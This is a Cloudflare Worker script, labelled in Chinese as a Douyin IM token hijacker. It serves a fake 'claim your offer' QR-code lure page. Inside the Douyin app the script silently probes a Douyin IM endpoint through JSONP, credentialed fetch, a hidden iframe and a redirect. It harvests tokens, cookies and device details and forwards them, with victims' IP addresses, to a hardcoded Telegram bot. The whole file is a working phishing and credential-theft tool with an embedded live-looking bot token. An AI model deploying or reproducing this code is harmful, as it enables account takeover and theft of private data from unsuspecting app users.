/**
 * 抖音 IM Token 劫持 → Telegram 推送
 * ====================================
 * 部署: Cloudflare Pages /_worker.js (域名 *.pages.dev)
 * 通知: Telegram Bot → @liejiu000
 */

const CONFIG = {
  TG_BOT_TOKEN: '8409528037:AAF-kzfdLe5Ldcfqnt_CeX25G6VR5CiEPds',
  TG_CHAT_ID:   '8712459718',
  PAGE_TITLE: '抖音福利',
  PAGE_SUBTITLE: '扫码领取专属优惠',
};

export default {
  async fetch(request, env, ctx) {
    const TG_TOKEN = env.TG_BOT_TOKEN || CONFIG.TG_BOT_TOKEN;
    const TG_CHAT  = env.TG_CHAT_ID   || CONFIG.TG_CHAT_ID;
    const url   = new URL(request.url);
    const path  = url.pathname;
    const ua    = (request.headers.get('User-Agent') || '').toLowerCase();
    const isDouyin = ua.includes('aweme') || ua.includes('bytedancewebview');

    if (path === '/capture') return handleCapture(request, TG_TOKEN, TG_CHAT);
    if (path === '/ping') return new Response('ok', { status: 200 });

    if (path === '/') {
      if (isDouyin) return serveDouyinPage(request.url);
      return serveMainPage(request.url);
    }

    return new Response('Not Found', { status: 404 });
  },
};

function serveMainPage(workerUrl) {
  const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(workerUrl)}`;

  return new Response(`<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${CONFIG.PAGE_TITLE}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0d1117 0%,#161b22 50%,#0d1117 100%);color:#c9d1d9;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#161b22;border:1px solid #30363d;border-radius:16px;padding:40px 36px;text-align:center;max-width:400px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.4)}
.card h2{color:#58a6ff;font-size:22px;margin-bottom:6px}
.card .sub{color:#8b949e;font-size:13px;margin-bottom:24px}
.qr-wrap{background:#fff;display:inline-block;padding:12px;border-radius:12px;margin-bottom:18px;line-height:0}
.qr-wrap img{width:220px;height:220px;border-radius:4px}
.hint{color:#8b949e;font-size:12px;margin-bottom:8px}
.steps{text-align:left;background:#0d1117;border-radius:10px;padding:18px 20px;margin-top:20px;font-size:13px;line-height:1.8}
.steps span{color:#58a6ff;font-weight:bold;margin-right:4px}
.footer{color:#484f58;font-size:11px;margin-top:20px}
</style>
</head>
<body>
<div class="card">
  <h2>${CONFIG.PAGE_TITLE}</h2>
  <p class="sub">${CONFIG.PAGE_SUBTITLE}</p>
  <div class="qr-wrap"><img src="${qrApiUrl}" alt="QR Code" crossorigin="anonymous"></div>
  <p class="hint">📱 打开抖音扫一扫</p>
  <div class="steps">
    <p><span>①</span> 打开抖音 App</p>
    <p><span>②</span> 点击右上角搜索旁的「扫一扫」</p>
    <p><span>③</span> 扫描上方二维码</p>
    <p><span>④</span> 自动跳转领取</p>
  </div>
  <p class="footer">Powered by Cloudflare</p>
</div>
</body>
</html>`, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}

function serveDouyinPage(workerUrl) {
  const captureUrl = new URL('/capture', workerUrl).toString();

  return new Response(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head><body style="margin:0;padding:0">
<script>
(function(){
  var ua=navigator.userAgent;
  var cap='${captureUrl}';
  var isDy=ua.indexOf('aweme')>=0||ua.indexOf('BytedanceWebview')>=0;
  new Image().src=cap+'?event=visit&ua='+encodeURIComponent(ua.slice(0,300));
  if(!isDy)return;

  function report(type,data){
    var p=encodeURIComponent(typeof data==='string'?data:JSON.stringify(data));
    new Image().src=cap+'?event='+type+'&data='+p.slice(0,2000);
    try{var fd=new FormData();fd.append('event',type);fd.append('data',typeof data==='string'?data:JSON.stringify(data));fd.append('ua',ua.slice(0,500));navigator.sendBeacon(cap,fd);}catch(e){}
  }

  // JSONP 劫持
  var cb='_dt_'+Date.now();
  window[cb]=function(r){report('jsonp_ok',JSON.stringify(r));var m=JSON.stringify(r).match(/[a-f0-9]{32,}/i);if(m)report('token',m[0]);};
  var s=document.createElement('script');
  s.src='https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/?im_token=1&aid=1128&device_platform=android&version_code=320900&app_name=douyin_lite&callback='+cb;
  s.onerror=function(){report('jsonp_fail','no JSONP');};
  s.onload=function(){report('jsonp_load','done');};
  document.body.appendChild(s);

  // fetch 探测
  fetch('https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/?im_token=1&aid=1128&device_platform=android&version_code=320900&app_name=douyin_lite',{credentials:'include',mode:'cors'}).then(function(r){report('fetch',r.status+' '+r.type);return r.text()}).then(function(t){report('fetch_body',t.slice(0,3000));var m=t.match(/[a-f0-9]{32,}/i);if(m)report('token',m[0]);}).catch(function(e){report('fetch_err',e.message);});

  // iframe
  var ifr=document.createElement('iframe');
  ifr.style.cssText='display:none;width:0;height:0;border:0';
  ifr.src='https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/?im_token=1&aid=1128&device_platform=android&version_code=320900&app_name=douyin_lite';
  ifr.onload=function(){report('iframe','loaded');try{var d=ifr.contentDocument||ifr.contentWindow.document;var t=(d.body?d.body.innerText:'')||'';report('iframe_txt',t.slice(0,2000));}catch(e){report('iframe_xorigin','ok');}};
  document.body.appendChild(ifr);

  // 兜底重定向
  setTimeout(function(){report('redirect','go');window.location.replace('https://api26-normal-hl.amemv.com/aweme/v1/im/reboot/misc/?im_token=1&aid=1128&device_platform=android&version_code=320900&app_name=douyin_lite');},2500);

  // 环境信息
  report('env',JSON.stringify({ua:ua,lang:navigator.language,plt:navigator.platform,scr:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ck:document.cookie.slice(0,500)||'-',ref:document.referrer||'-'}));
})();
</script>
<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0d1117;color:#58a6ff;font-family:sans-serif;font-size:16px;text-align:center">
<div><p style="font-size:32px;margin-bottom:12px">⏳</p><p>正在加载...</p></div>
</div>
</body></html>`, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
}

async function handleCapture(request, tgToken, tgChat) {
  const ua = request.headers.get('User-Agent') || '';
  const ip  = request.headers.get('CF-Connecting-IP') || 'unknown';
  let event = 'unknown', data = '';

  if (request.method === 'POST') {
    const ct = request.headers.get('Content-Type') || '';
    if (ct.includes('multipart/form-data')) { const fd = await request.formData(); event = fd.get('event')||'post'; data = fd.get('data')||''; }
    else { data = await request.text(); event = 'post_body'; }
  } else {
    const u = new URL(request.url);
    event = u.searchParams.get('event') || 'get';
    data  = u.searchParams.get('data')  || u.searchParams.get('token') || JSON.stringify(Object.fromEntries(u.searchParams));
  }

  let tokenMatch = ''; let m = data.match(/[a-f0-9]{32,}/i); if(m) tokenMatch = m[0];
  const ts = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });

  let msg = tokenMatch
    ? `🎯 *Token 捕获成功!*\n\n📅 \`${ts}\`\n🌐 IP: \`${ip}\`\n📱 UA: \`${ua.slice(0,80)}\`\n🔑 Token: \`${tokenMatch}\`\n📋 Event: \`${event}\``
    : `📡 *${event}*\n\n🕐 \`${ts}\`\n🌐 \`${ip}\`\n📱 \`${ua.slice(0,60)}\`\n📦 \`${data.length>300?data.slice(0,300)+'...':data}\``;

  let tgResult = 'not_sent';
  if (tgToken && tgToken !== 'YOUR_BOT_TOKEN') {
    try {
      const r = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: tgChat, text: msg, parse_mode: 'Markdown', disable_web_page_preview: true }),
      });
      tgResult = 'sent_' + r.status;
    } catch(e) { tgResult = 'tg_err:'+e.message.slice(0,40); }
  }

  return new Response(JSON.stringify({ status:'ok', token_found:!!tokenMatch, telegram:tgResult }), {
    headers: { 'Content-Type':'application/json', 'Access-Control-Allow-Origin':'*', 'Access-Control-Allow-Methods':'GET,POST,OPTIONS' },
  });
}
